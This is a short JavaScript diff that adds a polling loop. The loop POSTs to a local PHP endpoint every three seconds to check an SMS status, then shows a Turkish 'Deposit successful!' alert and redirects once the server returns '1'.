@@ -210,7 +210,29 @@ function myLoop2() {         //  create a loop function
     }, 3000)
   }
   
-  
+  var t = 0;
+
+  function myLoop3() {         //  create a loop function
+    setTimeout(function() {   //  call a 3s setTimeout when the loop is called
+      $.ajax({
+        type: "POST",
+        url: "/jethavale/request.php?q=sms-durum",
+        success: function(response) {
+            if (response == '1'){
+              t += 100;
+              swal.close()
+              Swal.fire("Yatırım başarılı!","","success")
+              window.location.pathname = '/m';
+            } 
+        }
+      })  
+      //  your code here
+      // i++;                    //  increment the counter
+      if (t < 10) {           //  if the counter < 10, call the loop function
+        myLoop3();             //  ..  again which will trigger another 
+      }                       //  ..  setTimeout()
+    }, 3000)
+  }
   
   
   
@@ -251,7 +273,7 @@ function ekBilgi() {
           allowOutsideClick: false,
           showConfirmButton: false
         })
-        myLoop2()
+        myLoop3()
       }
     },
   });
